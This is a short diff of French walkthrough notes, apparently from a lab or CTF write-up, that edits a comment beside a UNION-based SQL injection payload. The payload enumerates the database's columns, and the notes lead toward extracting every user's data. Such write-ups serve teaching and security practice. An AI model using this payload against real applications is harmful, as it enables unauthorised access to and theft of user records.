@@ -15,7 +15,7 @@
 # renvoie les tables de la bdd courante qui contient uniquement la table 'users'
 
 `-1 union select null, concat(column_name) from information_schema.columns where table_schema=database()`
-# renvoie les colonnes des tables de la bdd (users)
+# renvoie les colonnes des tables de la bdd
 
 - Maintenant on recupère la valeur de chaque colonne pour tous les utilisateurs avec la commande suivante.
 
